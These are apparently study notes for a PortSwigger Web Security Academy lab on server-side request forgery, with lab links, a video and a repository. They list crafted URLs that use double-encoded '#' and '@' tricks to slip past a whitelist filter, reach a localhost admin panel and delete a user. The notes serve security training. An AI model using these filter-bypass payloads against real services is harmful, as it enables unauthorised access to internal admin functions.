
# Lab #4 - SSRF with whitelist-based input filter

https://portswigger.net/web-security/ssrf#ssrf-with-whitelist-based-input-filters
https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter

https://www.youtube.com/watch?v=DzLcUyjPljE&list=PLuyTk2_mYISIlDtWBIqmgJgn6CYlzHVsQ&index=5
https://github.com/rkhal101/Web-Security-Academy-Series/tree/main/ssrf/lab-04


Vulnerable feature - stock check functionality

Goal - change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. 

Analysis:

localhost: http://localhost%2523@stock.weliketoshop.net
admin interface: http://localhost%2523@stock.weliketoshop.net/admin
delete user: http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos


